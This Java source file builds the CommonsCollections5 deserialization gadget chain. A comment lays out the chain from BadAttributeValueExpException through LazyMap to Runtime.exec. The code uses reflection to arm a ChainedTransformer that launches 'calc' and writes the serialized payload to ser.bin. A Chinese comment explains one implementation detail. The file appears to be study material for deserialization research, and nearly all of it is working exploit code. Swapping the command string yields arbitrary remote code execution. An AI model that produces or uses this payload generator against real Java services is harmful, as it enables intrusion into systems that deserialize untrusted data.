package org.CC.CC5;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import javax.management.BadAttributeValueExpException;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.Map;

/**
 * Gadget chain:
 *         ObjectInputStream.readObject()
 *             BadAttributeValueExpException.readObject()
 *                 TiedMapEntry.toString()
 *                     LazyMap.get()
 *                         ChainedTransformer.transform()
 *                             ConstantTransformer.transform()
 *                             InvokerTransformer.transform()
 *                                 Method.invoke()
 *                                     Class.getMethod()
 *                             InvokerTransformer.transform()
 *                                 Method.invoke()
 *                                     Runtime.getRuntime()
 *                             InvokerTransformer.transform()
 *                                 Method.invoke()
 *                                     Runtime.exec()
 */

public class CC5Test {
    public static void main (String[] args) throws Exception{
        Transformer[] fake = new Transformer[]{
                new ConstantTransformer(1),
        };
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[]{String.class,Class[].class}, new Object[]{"getRuntime",null}),
                new InvokerTransformer("invoke", new Class[]{Object.class,Object[].class}, new Object[]{Runtime.class,null}),
                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"})
        };
        ChainedTransformer chainedTransformer = new ChainedTransformer(fake);
        HashMap<Object, Object> hashMap = new HashMap<>();
        hashMap.put(1, "value");
        Map lazyMap = LazyMap.decorate(hashMap, chainedTransformer);
        TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap,"aaa");
        //这里不需要remove(aaa)，因为后续代码中没有将tiedMapEntry执行操作，这里指的是，没有put，add这种需要重新计算hashCode的操作，不会出发LazyMap的get操作
        BadAttributeValueExpException badAttributeValueExpException = new BadAttributeValueExpException(null);
        Field valField = badAttributeValueExpException.getClass().getDeclaredField("val");
        valField.setAccessible(true);
        valField.set(badAttributeValueExpException, tiedMapEntry);
        Field iTransformersField = chainedTransformer.getClass().getDeclaredField("iTransformers");
        iTransformersField.setAccessible(true);
        iTransformersField.set(chainedTransformer,transformers);
        serialize(badAttributeValueExpException);
    }
    public static void serialize(Object obj) throws IOException {
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("ser.bin"));
        oos.writeObject(obj);
    }
}
